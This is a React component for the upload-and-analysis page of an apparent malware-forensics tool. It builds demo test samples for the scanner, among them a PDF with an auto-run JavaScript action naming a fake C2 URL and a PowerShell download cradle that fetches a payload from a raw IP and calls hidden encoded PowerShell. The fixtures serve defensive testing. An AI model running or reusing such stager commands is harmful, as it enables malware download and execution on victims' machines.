import React, { useState, useRef } from 'react';
import {
  Upload,
  AlertCircle,
  ShieldAlert,
  ArrowRight,
  FileDown,
  CheckCircle2,
  RefreshCw,
  FileCode,
  Network,
  Shield,
  Lock,
  ChevronDown,
  ChevronUp,
  Copy,
  Check,
} from 'lucide-react';
import { api } from '../services/api';
import { InvestigationSummary, EvidenceItem } from '../types';
import { ScanVerdictModal } from '../components/modals/ScanVerdictModal';

interface InvestigateProps {
  onInvestigationComplete: (id: string) => void;
  onNavigateToGraph: (id: string) => void;
  onNavigateToDetails: (id: string) => void;
  onNavigateToDefense?: (id: string) => void;
}

export const Investigate: React.FC<InvestigateProps> = ({
  onInvestigationComplete,
  onNavigateToGraph,
  onNavigateToDetails,
  onNavigateToDefense,
}) => {
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [previewSha256, setPreviewSha256] = useState<string | null>(null);
  const [dragActive, setDragActive] = useState(false);
  const [analyzing, setAnalyzing] = useState(false);
  const [currentStage, setCurrentStage] = useState<number>(0);
  const [error, setError] = useState<string | null>(null);
  const [result, setResult] = useState<InvestigationSummary | null>(null);
  const [evidence, setEvidence] = useState<EvidenceItem[]>([]);
  const [showPopup, setShowPopup] = useState(false);
  const [showTechnicalDetails, setShowTechnicalDetails] = useState(false);
  const [copiedHash, setCopiedHash] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  const calculateFileSha256 = async (file: File) => {
    try {
      const buffer = await file.arrayBuffer();
      const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      const hashHex = hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
      setPreviewSha256(hashHex);
    } catch {
      setPreviewSha256(null);
    }
  };

  const handleSelectFile = (file: File) => {
    setSelectedFile(file);
    calculateFileSha256(file);
    setError(null);
    setResult(null);
  };

  const handleLoadDemoSample = (sampleType: 'exploit_pdf' | 'ps1_script' | 'benign_pdf') => {
    let file: File;
    if (sampleType === 'exploit_pdf') {
      const content = '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n4 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert("http://malicious-c2-update.org/payload.exe");) >>\nendobj\nxref\n0 5\n0000000000 65535 f\n0000000009 00000 n\n0000000074 00000 n\n0000000133 00000 n\n0000000204 00000 n\ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n340\n%%EOF';
      file = new File([content], 'urgent_invoice_action.pdf', { type: 'application/pdf' });
    } else if (sampleType === 'ps1_script') {
      const content = '$wc = New-Object System.Net.WebClient\n$wc.DownloadFile("http://185.196.11.42/payload.bin", "$env:TEMP\\agent.exe")\npowershell -w hidden -enc aQB3AHIA...';
      file = new File([content], 'system_update_cradle.ps1', { type: 'text/x-script' });
    } else {
      const content = '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\nxref\n0 3\n0000000000 65535 f\n0000000009 00000 n\n0000000058 00000 n\ntrailer\n<< /Size 3 /Root 1 0 R >>\nstartxref\n110\n%%EOF';
      file = new File([content], 'academic_research_proposal.pdf', { type: 'application/pdf' });
    }
    handleSelectFile(file);
  };

  const stages = [
    'Secure Ingestion & SHA-256 Nonce Verification',
    'Static Header & Magic Byte Validation',
    'YARA Signature Pattern Compilation & Matching',
    '14-Dimensional Structural Vector Engineering',
    'Supervised Random Forest & Isolation Forest Inference',
    'Causal Attack-Chain Topology Construction',
    'Forensic Incident Report Compilation',
  ];

  const handleFileDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setDragActive(false);
    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      handleSelectFile(e.dataTransfer.files[0]);
    }
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      handleSelectFile(e.target.files[0]);
    }
  };

  const startAnalysis = async () => {
    if (!selectedFile) return;

    try {
      setAnalyzing(true);
      setError(null);
      setResult(null);

      // Visual progress feedback
      let stageTimer = 0;
      const interval = setInterval(() => {
        stageTimer += 1;
        if (stageTimer < stages.length) {
          setCurrentStage(stageTimer);
        }
      }, 350);

      const res = await api.analyzeFile(selectedFile);
      clearInterval(interval);
      setCurrentStage(stages.length);

      let evList: EvidenceItem[] = [];
      try {
        evList = await api.getEvidence(res.id);
      } catch (e) {
        console.warn('Could not fetch evidence list:', e);
      }

      setResult(res);
      setEvidence(evList);
      setShowPopup(true);
      onInvestigationComplete(res.id);
    } catch (err: any) {
      setError(err.message || 'Forensic analysis failed');
    } finally {
      setAnalyzing(false);
    }
  };

  return (
    <div className="space-y-6 max-w-4xl mx-auto">
      {/* Page Header */}
      <div className="border-b border-[#27272a] pb-4">
        <h1 className="text-base font-bold text-white flex items-center gap-2">
          <span>Cryptographic Ingestion & File Forensics</span>
          <span className="text-[10px] font-mono font-semibold px-2 py-0.5 rounded bg-[#121214] text-zinc-300 border border-[#27272a]">
            Quarantine Storage
          </span>
        </h1>
        <p className="text-xs text-zinc-400 mt-1">
          Upload untrusted documents, executables, scripts, or archives for automated non-executing digital forensics.
        </p>
      </div>

      {/* Upload Instructions Card */}
      <div className="p-4 rounded border border-[#27272a] bg-[#09090b] grid grid-cols-1 md:grid-cols-3 gap-3 text-xs">
        <div className="flex items-start gap-2.5">
          <div className="w-6 h-6 rounded border border-zinc-700 bg-[#121214] flex items-center justify-center text-white shrink-0 font-bold text-[11px]">
            1
          </div>
          <div>
            <div className="font-semibold text-white">Safe Quarantine</div>
            <div className="text-[11px] text-zinc-400 mt-0.5">Stored as non-executable UUID in quarantined sandbox.</div>
          </div>
        </div>

        <div className="flex items-start gap-2.5">
          <div className="w-6 h-6 rounded border border-zinc-700 bg-[#121214] flex items-center justify-center text-white shrink-0 font-bold text-[11px]">
            2
          </div>
          <div>
            <div className="font-semibold text-white">Non-Executing Parse</div>
            <div className="text-[11px] text-zinc-400 mt-0.5">Static byte AST parsing prevents hostile payload detonation.</div>
          </div>
        </div>

        <div className="flex items-start gap-2.5">
          <div className="w-6 h-6 rounded border border-zinc-700 bg-[#121214] flex items-center justify-center text-white shrink-0 font-bold text-[11px]">
            3
          </div>
          <div>
            <div className="font-semibold text-white">Dual ML Scoring</div>
            <div className="text-[11px] text-zinc-400 mt-0.5">Random Forest + Isolation Forest 14D classification.</div>
          </div>
        </div>
      </div>

      {/* Quick Test Samples */}
      <div className="flex items-center justify-between text-xs p-3 rounded border border-[#27272a] bg-[#09090b]">
        <span className="text-zinc-400 text-[11px]">Laboratory Test Bench:</span>
        <div className="flex items-center gap-2">
          <button
            onClick={() => handleLoadDemoSample('benign_pdf')}
            className="px-2.5 py-1 rounded border border-[#27272a] bg-[#121214] hover:bg-[#18181b] text-zinc-200 text-[11px] font-medium cursor-pointer"
          >
            Safe PDF
          </button>
          <button
            onClick={() => handleLoadDemoSample('exploit_pdf')}
            className="px-2.5 py-1 rounded border border-[#27272a] bg-[#121214] hover:bg-[#18181b] text-zinc-200 text-[11px] font-medium cursor-pointer"
          >
            Exploit PDF
          </button>
          <button
            onClick={() => handleLoadDemoSample('ps1_script')}
            className="px-2.5 py-1 rounded border border-[#27272a] bg-[#121214] hover:bg-[#18181b] text-zinc-200 text-[11px] font-medium cursor-pointer"
          >
            PowerShell Stager
          </button>
        </div>
      </div>

      {/* Drag & Drop Zone */}
      <div
        onDragOver={(e) => {
          e.preventDefault();
          setDragActive(true);
        }}
        onDragLeave={() => setDragActive(false)}
        onDrop={handleFileDrop}
        onClick={() => inputRef.current?.click()}
        className={`p-10 rounded border-2 border-dashed text-center transition-all cursor-pointer bg-[#09090b] ${
          dragActive
            ? 'border-white bg-[#121214]'
            : selectedFile
            ? 'border-zinc-500 bg-[#121214]'
            : 'border-[#27272a] hover:border-zinc-500 hover:bg-[#121214]'
        }`}
      >
        <input
          ref={inputRef}
          type="file"
          onChange={handleFileChange}
          className="hidden"
        />

        <div className="w-12 h-12 rounded border border-[#27272a] bg-[#121214] flex items-center justify-center mx-auto mb-3 text-white">
          <Upload className="w-6 h-6 text-white" />
        </div>

        {selectedFile ? (
          <div className="space-y-1.5">
            <div className="text-sm font-bold text-white flex items-center justify-center gap-2">
              <FileCode className="w-4 h-4 text-white" />
              <span>{selectedFile.name}</span>
            </div>
            <div className="text-xs text-zinc-400 font-mono">
              Size: {(selectedFile.size / 1024).toFixed(1)} KB • Type: {selectedFile.type || 'Binary / Unspecified'}
            </div>
            {previewSha256 && (
              <div className="text-[11px] font-mono text-zinc-400 pt-1">
                SHA-256: <span className="text-white select-all">{previewSha256}</span>
              </div>
            )}
            <div className="text-[11px] text-zinc-400 pt-2 font-mono">
              Click or drag another file to replace
            </div>
          </div>
        ) : (
          <div>
            <div className="text-sm font-semibold text-white">
              Select or drag and drop a suspicious sample here
            </div>
            <div className="text-xs text-zinc-500 mt-1">
              Click to browse your local filesystem
            </div>
          </div>
        )}
      </div>

      {/* Action Buttons */}
      {selectedFile && !analyzing && !result && (
        <div className="flex items-center justify-end gap-3">
          <button
            onClick={() => setSelectedFile(null)}
            className="px-4 py-2 rounded border border-[#27272a] hover:bg-[#18181b] text-xs font-semibold text-zinc-300 cursor-pointer"
          >
            Clear Selection
          </button>
          <button
            onClick={startAnalysis}
            className="flex items-center gap-2 px-5 py-2 rounded bg-white hover:bg-zinc-200 text-black text-xs font-semibold shadow-xs cursor-pointer transition-all active:scale-95"
          >
            <ShieldAlert className="w-4 h-4 text-black" />
            <span>Execute Forensic Analysis</span>
          </button>
        </div>
      )}

      {/* Error Banner */}
      {error && (
        <div className="p-4 rounded bg-[#121214] border border-zinc-700 text-white text-xs flex items-center gap-3">
          <AlertCircle className="w-5 h-5 shrink-0 text-white" />
          <span>{error}</span>
        </div>
      )}

      {/* Analysis Progress */}
      {analyzing && (
        <div className="p-5 rounded border border-[#27272a] bg-[#09090b] space-y-4">
          <div className="flex items-center justify-between text-xs">
            <span className="font-semibold text-white flex items-center gap-2">
              <RefreshCw className="w-4 h-4 text-white animate-spin" />
              <span>Analyzing Sample: {selectedFile?.name}</span>
            </span>
            <span className="text-white font-mono text-[11px]">
              Stage {Math.min(currentStage + 1, stages.length)} / {stages.length}
            </span>
          </div>

          {/* Progress Bar */}
          <div className="w-full bg-[#121214] rounded-full h-1.5 overflow-hidden border border-[#27272a]">
            <div
              className="bg-white h-1.5 rounded-full transition-all duration-300"
              style={{ width: `${((currentStage + 1) / stages.length) * 100}%` }}
            ></div>
          </div>

          {/* Stages List */}
          <div className="grid grid-cols-1 gap-1.5 pt-1 text-xs">
            {stages.map((st, i) => {
              const isPast = i < currentStage;
              const isCurr = i === currentStage;
              return (
                <div
                  key={i}
                  className={`flex items-center gap-2.5 px-3 py-1.5 rounded text-[11px] ${
                    isCurr
                      ? 'bg-white text-black font-semibold'
                      : isPast
                      ? 'text-zinc-300'
                      : 'text-zinc-600'
                  }`}
                >
                  {isPast ? (
                    <CheckCircle2 className="w-3.5 h-3.5 text-zinc-300 shrink-0" />
                  ) : isCurr ? (
                    <RefreshCw className="w-3.5 h-3.5 text-black animate-spin shrink-0" />
                  ) : (
                    <div className="w-3.5 h-3.5 rounded-full border border-zinc-700 shrink-0"></div>
                  )}
                  <span>{st}</span>
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* Analysis Result Card */}
      {result && (
        <div className="p-6 rounded border border-[#27272a] bg-[#09090b] space-y-5">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-[#27272a]">
            <div>
              <div className="text-[10px] text-zinc-400 uppercase tracking-wider font-mono">Triage Complete</div>
              <h2 className="text-base font-bold text-white">{result.original_name}</h2>
              <div className="flex items-center gap-1.5 text-[11px] text-zinc-400 font-mono mt-0.5">
                <span>SHA-256: {result.sha256}</span>
                <button
                  type="button"
                  onClick={() => {
                    navigator.clipboard.writeText(result.sha256);
                    setCopiedHash(true);
                    setTimeout(() => setCopiedHash(false), 2000);
                  }}
                  className="p-1 rounded hover:bg-[#18181b] text-zinc-400 hover:text-white cursor-pointer transition-colors"
                  title="Copy SHA-256 hash"
                >
                  {copiedHash ? <Check className="w-3.5 h-3.5 text-white" /> : <Copy className="w-3.5 h-3.5" />}
                </button>
              </div>
            </div>

            <div className="flex items-center gap-2 self-start sm:self-auto">
              <span className="text-xs font-bold font-mono px-3 py-1 rounded border border-white bg-white text-black">
                {result.risk_score} / 100 • {result.risk_level} RISK
              </span>
            </div>
          </div>

          {/* Metrics Overview */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
            <div className="p-3 rounded bg-[#121214] border border-[#27272a] text-xs">
              <span className="text-zinc-400 text-[11px]">File Size</span>
              <div className="text-sm font-semibold text-white mt-0.5 font-mono">
                {(result.file_size_bytes / 1024).toFixed(1)} KB
              </div>
            </div>
            <div className="p-3 rounded bg-[#121214] border border-[#27272a] text-xs">
              <span className="text-zinc-400 text-[11px]">Format / MIME</span>
              <div className="text-sm font-semibold text-white mt-0.5 truncate">{result.file_type}</div>
            </div>
            <div className="p-3 rounded bg-[#121214] border border-[#27272a] text-xs">
              <span className="text-zinc-400 text-[11px]">Model Confidence</span>
              <div className="text-sm font-semibold text-white mt-0.5 font-mono">
                {(result.confidence_score * 100).toFixed(0)}%
              </div>
            </div>
            <div className="p-3 rounded bg-[#121214] border border-[#27272a] text-xs">
              <div className="flex items-center justify-between">
                <span className="text-zinc-400 text-[11px]">Analysis Coverage</span>
                <span className="text-[10px] text-zinc-400 font-mono">
                  {(result.coverage_score * 100) >= 95 ? 'Full Surface' : 'Multi-Layer'}
                </span>
              </div>
              <div className="text-sm font-semibold text-white mt-0.5 font-mono">
                {(result.coverage_score * 100).toFixed(0)}%
              </div>
            </div>
          </div>

          {/* AI Executive Summary */}
          {result.summary && (
            <div className="p-4 rounded bg-[#121214] border border-[#27272a] text-xs space-y-1.5">
              <div className="font-semibold text-white">Executive Forensic Summary</div>
              <p className="text-zinc-400 leading-relaxed text-[11px]">{result.summary}</p>
            </div>
          )}

          {/* Expandable Technical Details Preview */}
          <div className="pt-2">
            <button
              onClick={() => setShowTechnicalDetails(!showTechnicalDetails)}
              className="flex items-center gap-1.5 text-xs text-white hover:underline font-mono cursor-pointer"
            >
              {showTechnicalDetails ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
              <span>{showTechnicalDetails ? 'Hide Evaluation Parameters' : 'Show Evaluation Parameters & Hash Verifications'}</span>
            </button>

            {showTechnicalDetails && (
              <div className="mt-3 p-4 rounded bg-[#121214] border border-[#27272a] text-[11px] space-y-2 font-mono text-zinc-300">
                <div className="flex justify-between border-b border-[#27272a] pb-1">
                  <span className="text-zinc-500">Investigation UUID:</span>
                  <span>{result.id}</span>
                </div>
                <div className="flex justify-between border-b border-[#27272a] pb-1">
                  <span className="text-zinc-500">Cryptographic SHA-256:</span>
                  <span className="truncate max-w-[340px]">{result.sha256}</span>
                </div>
                <div className="flex justify-between border-b border-[#27272a] pb-1">
                  <span className="text-zinc-500">Ingestion Timestamp:</span>
                  <span>{result.created_at}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-zinc-500">Quarantine Storage Mode:</span>
                  <span className="text-white">NON-EXECUTABLE (000 PERMISSIONS)</span>
                </div>
              </div>
            )}
          </div>

          {/* Action Row */}
          <div className="flex flex-wrap items-center justify-between gap-3 pt-3 border-t border-[#27272a]">
            <button
              onClick={() => {
                setSelectedFile(null);
                setResult(null);
              }}
              className="px-3.5 py-1.5 rounded border border-[#27272a] hover:bg-[#18181b] text-zinc-300 text-xs font-semibold cursor-pointer"
            >
              Scan Another File
            </button>

            <div className="flex items-center gap-2">
              {onNavigateToDefense && (
                <button
                  onClick={() => onNavigateToDefense(result.id)}
                  className="flex items-center gap-1.5 px-3.5 py-1.5 rounded border border-[#27272a] bg-[#121214] hover:bg-white hover:text-black text-white text-xs font-semibold cursor-pointer transition-colors"
                >
                  <Shield className="w-4 h-4" />
                  <span>Defensive Simulation</span>
                </button>
              )}

              <button
                onClick={() => onNavigateToGraph(result.id)}
                className="flex items-center gap-1.5 px-3.5 py-1.5 rounded border border-[#27272a] bg-[#121214] hover:bg-white hover:text-black text-white text-xs font-semibold cursor-pointer transition-colors"
              >
                <Network className="w-4 h-4" />
                <span>Attack Graph</span>
              </button>

              <button
                onClick={() => onNavigateToDetails(result.id)}
                className="flex items-center gap-1.5 px-4 py-1.5 rounded bg-white hover:bg-zinc-200 text-black text-xs font-semibold shadow-xs cursor-pointer"
              >
                <span>Inspect Evidence Items</span>
                <ArrowRight className="w-4 h-4 text-black stroke-[2.5]" />
              </button>
            </div>
          </div>
        </div>
      )}

      {/* POPUP MODAL: Clean File vs Warning on Threats (Explains what is the problem in the file) */}
      <ScanVerdictModal
        isOpen={showPopup}
        onClose={() => setShowPopup(false)}
        verdict={result}
        evidence={evidence}
        onNavigateToDetails={onNavigateToDetails}
        onNavigateToDefense={onNavigateToDefense}
      />
    </div>
  );
};
